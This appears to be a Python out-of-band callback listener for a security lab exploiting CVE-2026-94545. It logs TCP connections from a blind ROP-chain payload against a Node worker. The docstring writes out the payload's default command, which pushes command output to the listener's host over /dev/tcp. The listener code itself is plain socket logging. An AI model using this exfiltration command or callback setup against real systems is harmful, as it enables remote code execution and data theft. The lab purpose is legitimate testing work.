#!/usr/bin/env python3
"""Out-of-band callback listener for the CVE-2026-94545 lab.

The exploit payload is blind: the successful ROP chain replaces the Node worker
process, so the command result has to leave the box over a second channel. The
default command baked into the template is

    bash -c 'id >/dev/tcp/<host>/<port>'

which opens a plain TCP connection and dumps the command output into it. This
listener accepts those connections and records them in oob-hits.log.

Usage:
    ./oob-listener.py [--host 0.0.0.0] [--port 4444] [--log oob-hits.log]
"""
import argparse
import datetime
import os
import socket
import sys
import threading


def human(payload: bytes) -> str:
    text = payload.decode("utf-8", "replace").rstrip("\n")
    return text if text.isprintable() else repr(payload)


def handle(conn: socket.socket, peer, log_path: str, lock: threading.Lock) -> None:
    with conn:
        conn.settimeout(5)
        chunks = []
        try:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                chunks.append(data)
        except (socket.timeout, ConnectionResetError):
            pass

    payload = b"".join(chunks)
    stamp = datetime.datetime.now().isoformat(timespec="seconds")
    line = f"{stamp} from={peer[0]}:{peer[1]} bytes={len(payload)} data={human(payload)}"
    with lock:
        with open(log_path, "a", encoding="utf-8") as fh:
            fh.write(line + "\n")
    print(f"[oob] {line}", flush=True)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=4444)
    parser.add_argument("--log", default="oob-hits.log")
    parser.add_argument("--pidfile", default="")
    args = parser.parse_args()

    lock = threading.Lock()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((args.host, args.port))
    server.listen(32)

    if args.pidfile:
        with open(args.pidfile, "w", encoding="utf-8") as fh:
            fh.write(str(os.getpid()))

    print(f"[oob] listening on {args.host}:{args.port} -> {args.log}", flush=True)
    while True:
        try:
            conn, peer = server.accept()
        except KeyboardInterrupt:
            print("[oob] stopped", flush=True)
            return 0
        threading.Thread(target=handle, args=(conn, peer, args.log, lock), daemon=True).start()


if __name__ == "__main__":
    sys.exit(main())
